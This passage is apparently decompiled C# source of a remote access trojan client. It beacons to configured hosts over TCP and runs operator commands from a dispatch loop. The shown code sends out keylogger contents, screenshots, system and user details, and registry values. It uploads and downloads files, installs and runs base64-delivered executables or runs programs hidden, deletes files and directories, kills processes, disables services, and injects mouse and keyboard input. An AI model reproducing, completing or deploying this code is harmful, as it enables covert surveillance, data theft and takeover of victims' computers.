          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        checked { ++index; }
      }
      if (Operators.CompareString(Left1, (string) null, false) == 0)
        return;
      this.streamWriter.WriteLine("/REGVIEWS/" + Left1);
      this.streamWriter.Flush();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private void ReadRegistry2(string Node)
  {
    try
    {
      string Left1 = (string) null;
      string[] strArray1 = (string[]) null;
      object obj1 = (object) Strings.Mid(Node, 3, Strings.Len(Node));
      Node = Strings.Left(Node, 2);
      RegistryKey registryKey = (RegistryKey) null;
      string Left2 = Node;
      if (Operators.CompareString(Left2, "CU", false) == 0)
      {
        strArray1 = Registry.CurrentUser.OpenSubKey(Conversions.ToString(obj1)).GetValueNames();
        registryKey = Registry.CurrentUser.OpenSubKey(Conversions.ToString(obj1));
      }
      else if (Operators.CompareString(Left2, "LM", false) == 0)
      {
        strArray1 = Registry.LocalMachine.OpenSubKey(Conversions.ToString(obj1)).GetValueNames();
        registryKey = Registry.LocalMachine.OpenSubKey(Conversions.ToString(obj1));
      }
      else if (Operators.CompareString(Left2, "US", false) == 0)
      {
        strArray1 = Registry.Users.OpenSubKey(Conversions.ToString(obj1)).GetValueNames();
        registryKey = Registry.Users.OpenSubKey(Conversions.ToString(obj1));
      }
      if (strArray1.Length <= 0)
        return;
      string[] strArray2 = strArray1;
      int index = 0;
      while (index < strArray2.Length)
      {
        object obj2 = (object) strArray2[index];
        object objectValue = RuntimeHelpers.GetObjectValue(registryKey.GetValue(Conversions.ToString(obj2)));
        if (objectValue != null)
        {
          string Right = objectValue.ToString();
          if (Right.Length > 100)
            Right = Right.Substring(0, 95) + " ...";
          try
          {
            Left1 = Operators.CompareString(Left1, (string) null, false) != 0 ? Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) (Left1 + "¥"), obj2), (object) "§"), (object) Right)) : Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(obj2, (object) "§"), (object) Right));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        checked { ++index; }
      }
      if (Operators.CompareString(Left1, (string) null, false) != 0)
      {
        this.streamWriter.WriteLine("/REGVIEWV/" + Left1);
        this.streamWriter.Flush();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private void down(string tempdata)
  {
    try
    {
      StringBuilder stringBuilder1 = new StringBuilder();
      StringBuilder stringBuilder2 = new StringBuilder();
      this._Index = (short) 1;
      this._InputFileStram = new FileStream(tempdata, FileMode.Open, FileAccess.Read, FileShare.Read);
      this._BinaryReader = new BinaryReader((Stream) this._InputFileStram);
      this._FileSize = this.FileSize(tempdata);
      if (this._FileSize < (long) this.ChunkSize)
      {
        this._BinaryReader.BaseStream.Seek(0L, SeekOrigin.Begin);
        this._Buffer = new byte[checked ((int) (this._FileSize - 1L) + 1)];
        this._BinaryReader.Read(this._Buffer, 0, checked ((int) this._FileSize));
        this._StartPosition = this._BinaryReader.BaseStream.Seek(0L, SeekOrigin.Current);
        stringBuilder1.Append("/STARTDOW/" + Conversions.ToString(this._FileSize) + "*");
        int num = checked (this._Buffer.Length - 1);
        int index = 0;
        while (index <= num)
        {
          stringBuilder2.Append(this._Buffer.GetValue(index).ToString() + " ");
          checked { ++index; }
        }
        stringBuilder1.Append((object) stringBuilder2);
        this.streamWriter.WriteLine((object) stringBuilder1);
        this.streamWriter.Flush();
      }
      else
      {
        this._Fragments = checked ((int) Math.Round(Math.Floor(unchecked ((double) this._FileSize / (double) this.ChunkSize))));
        this._RemainingBytes = checked (this._FileSize - (long) (this._Fragments * this.ChunkSize));
        this._BinaryReader.BaseStream.Seek(0L, SeekOrigin.Begin);
        this._Buffer = new byte[checked (this.ChunkSize - 1 + 1)];
        this._BinaryReader.Read(this._Buffer, 0, this.ChunkSize);
        this._StartPosition = this._BinaryReader.BaseStream.Seek(0L, SeekOrigin.Current);
        stringBuilder1.Append("/STARTDOW/" + Conversions.ToString(this._FileSize) + "*");
        int num = checked (this._Buffer.Length - 1);
        int index = 0;
        while (index <= num)
        {
          stringBuilder2.Append(this._Buffer.GetValue(index).ToString() + " ");
          checked { ++index; }
        }
        stringBuilder1.Append((object) stringBuilder2);
        this.streamWriter.WriteLine((object) stringBuilder1);
        this.streamWriter.Flush();
      }
    }
    catch (Exception ex1)
    {
      ProjectData.SetProjectError(ex1);
      try
      {
        this.StopStream();
        this.streamWriter.WriteLine("/ERROR/");
        this.streamWriter.Flush();
      }
      catch (Exception ex2)
      {
        ProjectData.SetProjectError(ex2);
        ProjectData.ClearProjectError();
      }
      ProjectData.ClearProjectError();
    }
  }

  private void down2()
  {
    try
    {
      if ((int) this._Index != this._Fragments)
      {
        StringBuilder stringBuilder1 = new StringBuilder();
        StringBuilder stringBuilder2 = new StringBuilder();
        checked { ++this._Index; }
        this._Buffer = new byte[checked (this.ChunkSize - 1 + 1)];
        this._BinaryReader.Read(this._Buffer, 0, this.ChunkSize);
        this._StartPosition = this._BinaryReader.BaseStream.Seek(0L, SeekOrigin.Current);
        stringBuilder1.Append("/PAKSSEND/");
        int num = checked (this._Buffer.Length - 1);
        int index = 0;
        while (index <= num)
        {
          stringBuilder2.Append(this._Buffer.GetValue(index).ToString() + " ");
          checked { ++index; }
        }
        stringBuilder1.Append((object) stringBuilder2);
        this.streamWriter.WriteLine((object) stringBuilder1);
        this.streamWriter.Flush();
      }
      else if (this._RemainingBytes > 0L)
      {
        StringBuilder stringBuilder3 = new StringBuilder();
        StringBuilder stringBuilder4 = new StringBuilder();
        this._Buffer = new byte[checked ((int) (this._RemainingBytes - 1L) + 1)];
        this._BinaryReader.Read(this._Buffer, 0, checked ((int) this._RemainingBytes));
        stringBuilder3.Append("/FINEDOWN/");
        int num = checked (this._Buffer.Length - 1);
        int index = 0;
        while (index <= num)
        {
          stringBuilder4.Append(this._Buffer.GetValue(index).ToString() + " ");
          checked { ++index; }
        }
        stringBuilder3.Append((object) stringBuilder4);
        this.streamWriter.WriteLine((object) stringBuilder3);
        this.streamWriter.Flush();
        this.StopStream();
      }
      else
      {
        this.streamWriter.WriteLine("/FINEDOWN/");
        this.streamWriter.Flush();
        this.StopStream();
      }
    }
    catch (Exception ex1)
    {
      ProjectData.SetProjectError(ex1);
      try
      {
        this.StopStream();
        this.streamWriter.WriteLine("/ERROR/");
        this.streamWriter.Flush();
      }
      catch (Exception ex2)
      {
        ProjectData.SetProjectError(ex2);
        ProjectData.ClearProjectError();
      }
      ProjectData.ClearProjectError();
    }
  }

  private void upl(string tempdata)
  {
    try
    {
      string[] strArray1 = tempdata.Split('*');
      string str = strArray1.GetValue(1).ToString();
      string path = strArray1.GetValue(0).ToString();
      if (!Directory.Exists(path))
        Directory.CreateDirectory(path);
      string[] strArray2 = (string[]) NewLateBinding.LateGet(NewLateBinding.LateGet(strArray1.GetValue(2), (System.Type) null, "Trim", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, "Split", new object[1]
      {
        (object) " "
      }, (string[]) null, (System.Type[]) null, (bool[]) null);
      byte[] numArray = new byte[checked (strArray2.GetUpperBound(0) + 1)];
      int num = checked (strArray2.Length - 1);
      int index = 0;
      while (index <= num)
      {
        numArray[index] = Conversions.ToByte(strArray2.GetValue(index));
        checked { ++index; }
      }
      if (strArray2.Length < 4096)
      {
        this._Mergedfile = path + str;
        if (System.IO.File.Exists(this._Mergedfile))
        {
          this.Delay(1);
          try
          {
            System.IO.File.Delete(this._Mergedfile);
          }
          catch (Exception ex1)
          {
            ProjectData.SetProjectError(ex1);
            try
            {
              this.Delay(1);
              this._OutputFileStram.Flush();
              this._OutputFileStram.Close();
              this._BinaryWriter.Close();
              System.IO.File.Delete(this._Mergedfile);
            }
            catch (Exception ex2)
            {
              ProjectData.SetProjectError(ex2);
              try
              {
                this.Delay(1);
              }
              catch (Exception ex3)
              {
                ProjectData.SetProjectError(ex3);
                System.IO.File.Delete(this._Mergedfile);
                ProjectData.ClearProjectError();
              }
              ProjectData.ClearProjectError();
            }
            ProjectData.ClearProjectError();
          }
        }
        this._OutputFileStram = new FileStream(this._Mergedfile, FileMode.CreateNew);
        this._BinaryWriter = new BinaryWriter((Stream) this._OutputFileStram);
        this._Buffer = new byte[checked (strArray2.Length - 1 + 1)];
        this._Buffer = numArray;
        this._BinaryWriter.Write(this._Buffer);
        this._OutputFileStram.Flush();
        this._OutputFileStram.Close();
        this._BinaryWriter.Close();
      }
      else
      {
        this._Mergedfile = path + str;
        if (System.IO.File.Exists(this._Mergedfile))
        {
          this.Delay(1);
          try
          {
            System.IO.File.Delete(this._Mergedfile);
          }
          catch (Exception ex4)
          {
            ProjectData.SetProjectError(ex4);
            try
            {
              this.Delay(1);
              this._OutputFileStram.Flush();
              this._OutputFileStram.Close();
              this._BinaryWriter.Close();
              System.IO.File.Delete(this._Mergedfile);
            }
            catch (Exception ex5)
            {
              ProjectData.SetProjectError(ex5);
              try
              {
                this.Delay(1);
              }
              catch (Exception ex6)
              {
                ProjectData.SetProjectError(ex6);
                System.IO.File.Delete(this._Mergedfile);
                ProjectData.ClearProjectError();
              }
              ProjectData.ClearProjectError();
            }
            ProjectData.ClearProjectError();
          }
        }
        this._OutputFileStram = new FileStream(this._Mergedfile, FileMode.CreateNew);
        this._BinaryWriter = new BinaryWriter((Stream) this._OutputFileStram);
        this._Buffer = new byte[checked (strArray2.Length - 1 + 1)];
        this._Buffer = numArray;
        this._BinaryWriter.Write(this._Buffer);
        this._OutputFileStram.Flush();
        this.streamWriter.WriteLine("/ANOTHEPK/");
        this.streamWriter.Flush();
      }
    }
    catch (Exception ex7)
    {
      ProjectData.SetProjectError(ex7);
      try
      {
        this._OutputFileStram.Flush();
        this._OutputFileStram.Close();
        this._BinaryWriter.Close();
        this.streamWriter.WriteLine("/ERRORUPL/");
        this.streamWriter.Flush();
      }
      catch (Exception ex8)
      {
        ProjectData.SetProjectError(ex8);
        ProjectData.ClearProjectError();
      }
      ProjectData.ClearProjectError();
    }
  }

  private void upl2(string tempdata)
  {
    try
    {
      string[] strArray = tempdata.Trim().Split(' ');
      byte[] numArray = new byte[checked (strArray.GetUpperBound(0) + 1)];
      int num = checked (strArray.Length - 1);
      int index = 0;
      while (index <= num)
      {
        numArray[index] = Conversions.ToByte(strArray.GetValue(index));
        checked { ++index; }
      }
      this._Buffer = new byte[checked (strArray.Length - 1 + 1)];
      this._Buffer = numArray;
      this._BinaryWriter.Write(this._Buffer);
      this._OutputFileStram.Flush();
      this.streamWriter.WriteLine("/ANOTHEPK/");
      this.streamWriter.Flush();
    }
    catch (Exception ex1)
    {
      ProjectData.SetProjectError(ex1);
      try
      {
        this._OutputFileStram.Flush();
        this._OutputFileStram.Close();
        this._BinaryWriter.Close();
        this.streamWriter.WriteLine("/ERRORUPL/");
        this.streamWriter.Flush();
      }
      catch (Exception ex2)
      {
        ProjectData.SetProjectError(ex2);
        ProjectData.ClearProjectError();
      }
      ProjectData.ClearProjectError();
    }
  }

  private void upl3(string tempdata)
  {
    try
    {
      if (Operators.CompareString(tempdata, "", false) != 0)
      {
        string[] strArray = tempdata.Trim().Split(' ');
        byte[] numArray = new byte[checked (strArray.GetUpperBound(0) + 1)];
        int num = checked (strArray.Length - 1);
        int index = 0;
        while (index <= num)
        {
          numArray[index] = Conversions.ToByte(strArray.GetValue(index));
          checked { ++index; }
        }
        this._Buffer = new byte[checked (strArray.Length - 1 + 1)];
        this._Buffer = numArray;
        this._BinaryWriter.Write(this._Buffer);
        this._OutputFileStram.Flush();
        this._OutputFileStram.Close();
        this._BinaryWriter.Close();
      }
      else
      {
        this._OutputFileStram.Flush();
        this._OutputFileStram.Close();
        this._BinaryWriter.Close();
      }
    }
    catch (Exception ex1)
    {
      ProjectData.SetProjectError(ex1);
      try
      {
        this._OutputFileStram.Flush();
        this._OutputFileStram.Close();
        this._BinaryWriter.Close();
        this.streamWriter.WriteLine("/ERRORUPL/");
        this.streamWriter.Flush();
      }
      catch (Exception ex2)
      {
        ProjectData.SetProjectError(ex2);
        ProjectData.ClearProjectError();
      }
      ProjectData.ClearProjectError();
    }
  }

  private void setcl(string tempdata)
  {
    try
    {
      string Left = tempdata;
      if (Operators.CompareString(Left, "right", false) == 0)
      {
        MainFrm.mouse_event(8, 0, 0, 0, 1);
        MainFrm.mouse_event(16, 0, 0, 0, 1);
      }
      else if (Operators.CompareString(Left, "left", false) == 0)
      {
        MainFrm.mouse_event(2, 0, 0, 0, 1);
        MainFrm.mouse_event(4, 0, 0, 0, 1);
      }
      else
      {
        if (Operators.CompareString(Left, "middle", false) != 0)
          return;
        MainFrm.mouse_event(32, 0, 0, 0, 1);
        MainFrm.mouse_event(64, 0, 0, 0, 1);
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private void setm(string tempdata)
  {
    try
    {
      string[] strArray = tempdata.Split('*');
      this.mp = new Point(checked ((int) Math.Round(Math.Floor(double.Parse(strArray[0])))), checked ((int) Math.Round(Math.Floor(double.Parse(strArray[1])))));
      Cursor.Position = this.mp;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private void installk(string tempdata)
  {
    try
    {
      string[] strArray = tempdata.Split('*');
      string str = strArray.GetValue(1).ToString();
      if (!Directory.Exists(strArray.GetValue(0).ToString()))
        Directory.CreateDirectory(strArray.GetValue(0).ToString());
      if (!System.IO.File.Exists(strArray.GetValue(0).ToString() + str))
      {
        byte[] data = Convert.FromBase64String(Conversions.ToString(strArray.GetValue(2)));
        MyProject.Computer.FileSystem.WriteAllBytes(strArray.GetValue(0).ToString() + str, data, false);
        this.Delay(5);
      }
      Process.Start(strArray.GetValue(0).ToString() + str);
      this.Action(true);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      this.Action(false);
      ProjectData.ClearProjectError();
    }
  }

  private void sendkeyb(string tempdata)
  {
    try
    {
      SendKeys.SendWait(tempdata);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private void first()
  {
    try
    {
      this.streamWriter.WriteLine(MyProject.Computer.Name + "*" + MyProject.User.Name + "*" + MyProject.Computer.Info.OSFullName + "*" + Application.ProductVersion + "G");
      this.streamWriter.Flush();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private void info()
  {
    try
    {
      this.objCS = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem");
      try
      {
        foreach (object Instance in this.objCS.Get())
        {
          this.m_strManufacturer = NewLateBinding.LateIndexGet(Instance, new object[1]
          {
            (object) "manufacturer"
          }, (string[]) null).ToString();
          this.m_StrModel = NewLateBinding.LateIndexGet(Instance, new object[1]
          {
            (object) "model"
          }, (string[]) null).ToString();
        }
      }
      finally
      {
        ManagementObjectCollection.ManagementObjectEnumerator objectEnumerator;
        objectEnumerator?.Dispose();
      }
      this.streamWriter.WriteLine("/INFOPCPC/" + "Computer Name = " + MyProject.Computer.Name + "±" + "Computer Manufacturer = " + this.Manufacturer + "±" + "Computer Model = " + this.Model + "±" + "OS Name = " + MyProject.Computer.Info.OSFullName + "±" + "OS Version = " + MyProject.Computer.Info.OSVersion + "±" + "System Type = " + MyProject.Computer.Info.OSPlatform + "±" + "Total Physical Memory = " + Conversions.ToString(MyProject.Computer.Info.TotalPhysicalMemory) + "±" + "Total Virtual Memory = " + Conversions.ToString(MyProject.Computer.Info.TotalVirtualMemory) + "±" + "Available Physical Memory = " + Conversions.ToString(MyProject.Computer.Info.AvailablePhysicalMemory) + "±" + "Available Virtual Memory = " + Conversions.ToString(MyProject.Computer.Info.AvailableVirtualMemory) + "±" + "Username = " + MyProject.User.Name + "±" + "System Directory = " + Environment.SystemDirectory);
      this.streamWriter.Flush();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private void log(bool t)
  {
    try
    {
      string tempPath = Path.GetTempPath();
      if (t)
      {
        MyProject.Computer.FileSystem.WriteAllText(tempPath + "logdll.txt", "", false);
        this.Action(true);
      }
      else
      {
        this.streamWriter.WriteLine("/KEYSLOGG/" + this.Encrypt(MyProject.Computer.FileSystem.ReadAllText(tempPath + "logdll.txt"), "&%#@?,:*"));
        this.streamWriter.Flush();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private void runex(string tempdata)
  {
    try
    {
      new Process()
      {
        StartInfo = {
          FileName = tempdata,
          WindowStyle = ProcessWindowStyle.Hidden
        }
      }.Start();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private void runex1(string tempdata)
  {
    try
    {
      new Process()
      {
        StartInfo = {
          FileName = tempdata,
          WindowStyle = ProcessWindowStyle.Normal
        }
      }.Start();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private void downd(string tempdata)
  {
    try
    {
      string str = (string) null;
      EncoderParameters encoderParams = new EncoderParameters(1);
      encoderParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, (long) int.Parse(tempdata));
      ImageCodecInfo encoderInfo = this.GetEncoderInfo("image/jpeg");
      Bitmap bitmap1 = new Bitmap(800, 600, PixelFormat.Format16bppRgb555);
      Rectangle bounds = Screen.PrimaryScreen.Bounds;
      Bitmap bitmap2 = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format16bppRgb555);
      Graphics.FromImage((Image) bitmap2).CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
      Graphics graphics = Graphics.FromImage((Image) bitmap1);
      graphics.InterpolationMode = InterpolationMode.HighQualityBilinear;
      graphics.CompositingQuality = CompositingQuality.HighSpeed;
      graphics.DrawImage((Image) bitmap2, 0, 0, 800, 600);
      MemoryStream memoryStream = new MemoryStream();
      bitmap1.Save((Stream) memoryStream, encoderInfo, encoderParams);
      memoryStream.Capacity = checked ((int) memoryStream.Length);
      string base64String = Convert.ToBase64String(memoryStream.GetBuffer());
      bitmap2.Dispose();
      bitmap1.Dispose();
      memoryStream.Dispose();
      memoryStream.Close();
      graphics.Dispose();
      this.streamWriter.WriteLine("/STARDESK/" + base64String);
      this.streamWriter.Flush();
      str = (string) null;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      this.Action(false);
      ProjectData.ClearProjectError();
    }
  }

  private void killproc(string tempdata)
  {
    try
    {
      Process processById = Process.GetProcessById(int.Parse(tempdata));
      try
      {
        if (processById == null)
          return;
        processById.Kill();
        this.streamWriter.WriteLine("/REFRESHP/");
        this.streamWriter.Flush();
      }
      catch (Exception ex1)
      {
        ProjectData.SetProjectError(ex1);
        try
        {
          Process.EnterDebugMode();
          processById.Kill();
          Process.LeaveDebugMode();
          this.streamWriter.WriteLine("/REFRESHP/");
          this.streamWriter.Flush();
        }
        catch (Exception ex2)
        {
          ProjectData.SetProjectError(ex2);
          this.Action(false);
          ProjectData.ClearProjectError();
        }
        ProjectData.ClearProjectError();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      this.Action(false);
      ProjectData.ClearProjectError();
    }
  }

  private void RunServer()
  {
label_1:
    while (true)
    {
      this.strInput = new StringBuilder();
      this.tcpClient = new TcpClient();
      this.RandomNumber(10, 20);
      string hostname1 = (string) null;
      string hostname2 = (string) null;
      try
      {
        hostname1 = Dns.GetHostEntry(this.adr).AddressList[0].ToString();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        hostname2 = Dns.GetHostEntry(this.adr2).AddressList[0].ToString();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        this.tcpClient.Connect(hostname1, this.port);
        this.networkStream = this.tcpClient.GetStream();
        this.streamReader = new StreamReader((Stream) this.networkStream);
        this.streamWriter = new StreamWriter((Stream) this.networkStream);
        this.restart = 0;
      }
      catch (Exception ex1)
      {
        ProjectData.SetProjectError(ex1);
        try
        {
          try
          {
            this.tcpClient.Connect(hostname1, this.port2);
            this.networkStream = this.tcpClient.GetStream();
            this.streamReader = new StreamReader((Stream) this.networkStream);
            this.streamWriter = new StreamWriter((Stream) this.networkStream);
            this.restart = 0;
          }
          catch (Exception ex2)
          {
            ProjectData.SetProjectError(ex2);
            try
            {
              this.tcpClient.Connect(hostname2, this.port);
              this.networkStream = this.tcpClient.GetStream();
              this.streamReader = new StreamReader((Stream) this.networkStream);
              this.streamWriter = new StreamWriter((Stream) this.networkStream);
              this.restart = 0;
            }
            catch (Exception ex3)
            {
              ProjectData.SetProjectError(ex3);
              try
              {
                this.tcpClient.Connect(hostname2, this.port2);
                this.networkStream = this.tcpClient.GetStream();
                this.streamReader = new StreamReader((Stream) this.networkStream);
                this.streamWriter = new StreamWriter((Stream) this.networkStream);
                this.restart = 0;
              }
              catch (Exception ex4)
              {
                ProjectData.SetProjectError(ex4);
                this.Cleanup();
                ProjectData.ClearProjectError();
                continue;
              }
              ProjectData.ClearProjectError();
            }
            ProjectData.ClearProjectError();
          }
        }
        catch (Exception ex5)
        {
          ProjectData.SetProjectError(ex5);
          ProjectData.ClearProjectError();
          continue;
        }
        ProjectData.ClearProjectError();
      }
      while (true)
      {
        try
        {
          string str1 = this.streamReader.ReadLine();
          string Left1 = Strings.Left(str1, 10);
          string str2;
          if (Operators.CompareString(Left1, "/FIRSTINF/", false) == 0)
          {
            try
            {
              new Thread(new ThreadStart(this.first)).Start();
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/INFOPCPC/", false) == 0)
          {
            try
            {
              new Thread(new ThreadStart(this.info)).Start();
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/KEYSLOGG/", false) == 0)
          {
            try
            {
              new Thread((ParameterizedThreadStart) (a0 => this.log(Conversions.ToBoolean(a0)))).Start((object) false);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/KEYSLOGR/", false) == 0)
          {
            try
            {
              new Thread((ParameterizedThreadStart) (a0 => this.log(Conversions.ToBoolean(a0)))).Start((object) true);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/OPENCDCD/", false) == 0)
          {
            try
            {
              string lpstrCommand = "Set CDaudio door open";
              MainFrm.mciExecute(ref lpstrCommand);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/CLOSECDD/", false) == 0)
          {
            try
            {
              string lpstrCommand = "Set CDaudio door closed";
              MainFrm.mciExecute(ref lpstrCommand);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/RUNEXEFL/", false) == 0)
          {
            try
            {
              string Left2 = Strings.Mid(str1, 11, 1);
              string parameter = Strings.Mid(str1, 12, Strings.Len(str1));
              if (Operators.CompareString(Left2, "1", false) == 0)
                new Thread((ParameterizedThreadStart) (a0 => this.runex(Conversions.ToString(a0)))).Start((object) parameter);
              else
                new Thread((ParameterizedThreadStart) (a0 => this.runex1(Conversions.ToString(a0)))).Start((object) parameter);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.Action(false);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/KILLFILE/", false) == 0)
          {
            try
            {
              string path = Strings.Mid(str1, 11, Strings.Len(str1));
              if (System.IO.File.Exists(path))
                System.IO.File.Delete(path);
              this.Action(true);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.Action(false);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/KILLDIRS/", false) == 0)
          {
            try
            {
              string directory = Strings.Mid(str1, 11, Strings.Len(str1));
              if (MyProject.Computer.FileSystem.DirectoryExists(directory))
                MyProject.Computer.FileSystem.DeleteDirectory(directory, DeleteDirectoryOption.DeleteAllContents);
              this.Action(true);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.Action(false);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/FILESIZE/", false) == 0)
          {
            try
            {
              this.streamWriter.WriteLine("/FILESIZE/" + Conversions.ToString(checked ((int) MyProject.Computer.FileSystem.GetFileInfo(Strings.Mid(str1, 11, Strings.Len(str1))).Length)));
              this.streamWriter.Flush();
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.Action(false);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/MAKEDIRS/", false) == 0)
          {
            try
            {
              string directory = Strings.Mid(str1, 11, Strings.Len(str1));
              if (MyProject.Computer.FileSystem.DirectoryExists(directory))
                this.Action(false);
              else
                MyProject.Computer.FileSystem.CreateDirectory(directory);
              this.Action(true);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.Action(false);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/LISTPROC/", false) == 0)
          {
            try
            {
              new Thread(new ThreadStart(this.proc)).Start();
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.Action(false);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/LISTSERV/", false) == 0)
          {
            try
            {
              new Thread(new ThreadStart(this.serv)).Start();
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.Action(false);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/STOPSERV/", false) == 0)
          {
            try
            {
              new ServiceControllerEx(Strings.Mid(str1, 11, Strings.Len(str1))).Stop();
              this.Action(true);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.Action(false);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/STRTSERV/", false) == 0)
          {
            try
            {
              new ServiceControllerEx(Strings.Mid(str1, 11, Strings.Len(str1))).Start();
              this.Action(true);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.Action(false);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/DSBLSERV/", false) == 0)
          {
            try
            {
              new ServiceControllerEx(Strings.Mid(str1, 11, Strings.Len(str1))).StartupType = "Disabled";
              this.Action(true);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.Action(false);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/MNULSERV/", false) == 0)
          {
            try
            {
              new ServiceControllerEx(Strings.Mid(str1, 11, Strings.Len(str1))).StartupType = "Manual";
              this.Action(true);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.Action(false);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/AUTOSERV/", false) == 0)
          {
            try
            {
              new ServiceControllerEx(Strings.Mid(str1, 11, Strings.Len(str1))).StartupType = "Auto";
              this.Action(true);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.Action(false);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/STOPDOWN/", false) == 0)
          {
            try
            {
              this.StopStream();
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/DOWNFILE/", false) == 0)
            new Thread((ParameterizedThreadStart) (a0 => this.down(Conversions.ToString(a0)))).Start((object) Strings.Mid(str1, 11, Strings.Len(str1)));
          else if (Operators.CompareString(Left1, "/ENCOREFL/", false) == 0)
            new Thread(new ThreadStart(this.down2)).Start();
          else if (Operators.CompareString(Left1, "/ERROR/", false) == 0)
          {
            try
            {
              this.StopStream();
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/STOPUPLD/", false) == 0)
          {
            try
            {
              this._OutputFileStram.Flush();
              this.StopStream();
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/UPLOADFL/", false) == 0)
            new Thread((ParameterizedThreadStart) (a0 => this.upl(Conversions.ToString(a0)))).Start((object) Strings.Mid(str1, 11, Strings.Len(str1)));
          else if (Operators.CompareString(Left1, "/OTHERPAK/", false) == 0)
            new Thread((ParameterizedThreadStart) (a0 => this.upl2(Conversions.ToString(a0)))).Start((object) Strings.Mid(str1, 11, Strings.Len(str1)));
          else if (Operators.CompareString(Left1, "/FINEUPLD/", false) == 0)
            new Thread((ParameterizedThreadStart) (a0 => this.upl3(Conversions.ToString(a0)))).Start((object) Strings.Mid(str1, 11, Strings.Len(str1)));
          else if (Operators.CompareString(Left1, "/DOWNDESK/", false) == 0)
          {
            try
            {
